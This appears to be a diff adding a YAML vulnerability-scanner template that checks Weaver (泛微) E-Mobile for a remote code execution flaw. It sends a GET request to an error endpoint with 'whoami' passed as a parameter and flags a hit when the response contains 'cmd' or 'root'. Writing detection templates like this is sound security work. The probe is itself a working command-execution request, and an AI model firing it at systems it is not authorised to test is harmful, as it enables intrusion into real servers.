@@ -1,0 +1,13 @@
+name: 泛微E-Mobile-error-RCE
+description: >
+  代码执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /client/common/error?a=whoami
+    expression:
+      status: 200
+      body_any:
+        - "cmd"
+        - "root"    
